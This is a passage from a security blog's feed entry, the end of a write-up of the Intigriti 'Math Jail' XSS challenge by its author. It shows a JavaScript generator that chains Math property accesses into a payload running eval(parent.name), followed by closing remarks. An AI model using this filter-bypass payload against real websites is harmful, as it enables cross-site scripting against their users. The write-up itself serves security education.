punctuation">)</span>      currentIndex<span class="token operator">++</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">let</span> mathResult <span class="token operator">=</span> <span class="token function">findTargetNumber</span><span class="token punctuation">(</span>currentIndex<span class="token punctuation">,</span> char<span class="token punctuation">.</span><span class="token function">charCodeAt</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>      mathResult<span class="token punctuation">.</span><span class="token function">reverse</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">// remember to reverse cause the order</span>      <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> row <span class="token keyword">of</span> mathResult<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">addFunction</span><span class="token punctuation">(</span>row<span class="token punctuation">)</span>      <span class="token punctuation">&#125;</span>      <span class="token function">addFunction</span><span class="token punctuation">(</span><span class="token string">'Math.abs.name.constructor.fromCharCode'</span><span class="token punctuation">)</span>      <span class="token function">addFunction</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>arrName<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">.push</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span>      currentIndex<span class="token operator">++</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>  <span class="token comment">// add eval structure</span>  <span class="token function">addFunction</span><span class="token punctuation">(</span><span class="token string">'Math.random.name.valueOf'</span><span class="token punctuation">)</span>  <span class="token function">addFunction</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>arrName<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">.join</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span>  <span class="token function">addFunction</span><span class="token punctuation">(</span><span class="token string">'Math.abs.constructor'</span><span class="token punctuation">)</span>  <span class="token function">addFunction</span><span class="token punctuation">(</span><span class="token string">'Math.abs.constructor.prototype.call.call'</span><span class="token punctuation">)</span>  <span class="token keyword">return</span> ans<span class="token punctuation">.</span><span class="token function">reverse</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token keyword">function</span> <span class="token function">addFunction</span><span class="token punctuation">(</span><span class="token parameter">name</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    ans<span class="token punctuation">.</span><span class="token function">unshift</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span>    codeResult <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>name<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">(</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>codeResult<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">)</span><span class="token template-punctuation string">`</span></span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>Math<span class="token punctuation">.</span>seeds <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token comment">// @credit: @DrBrix</span><span class="token keyword">const</span> arr <span class="token operator">=</span> <span class="token function">buildExploit</span><span class="token punctuation">(</span><span class="token string">'Math.seeds'</span><span class="token punctuation">,</span> <span class="token string">'eval(parent.name)'</span><span class="token punctuation">)</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'length:'</span><span class="token punctuation">,</span> arr<span class="token punctuation">.</span>length<span class="token punctuation">)</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>arr<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token string">','</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Perhaps there might be something even shorter, but I’m too lazy to search for it.</p><h2><span id="conclusion">Conclusion</span></h2><p>The above is the solution to the challenge and the thought process behind it.</p><p>Originally, the ideal situation was to find a usable array directly from Math, without needing <code>Math.seeds</code>. However, upon trying, it seems I couldn’t find such a solution.</p><p>I’ve also learned a lot from other hackers’ solutions, like clearing the array or achieving even shorter payloads, things I didn’t anticipate when designing the challenge. Kudos to all the hackers!</p><p>I hope that everyone has learned something from this challenge and had a great time participating.</p><p>Thank you all for your participation, and I look forward to crossing paths again in future challenges!</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;In the monthly challenges at Intigriti, I presented an XSS challenge that I named “Math Jail.” You can find the challenge at the following link: &lt;a href=&quot;https://challenge-0823.intigriti.io/&quot;&gt;https://challenge-0823.intigriti.io/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Now that the challenge has concluded, I’d like to take this opportunity to discuss the thought process behind creating the challenge and share some of the solutions that were developed.&lt;/p&gt;</summary>
    
    
    
    <category term="Security" scheme="https://blog.huli.tw/categories/Security/"/>
    
    
    <category term="Security" scheme="https://blog.huli.tw/tags/Security/"/>
    
  </entry>
  
</feed>
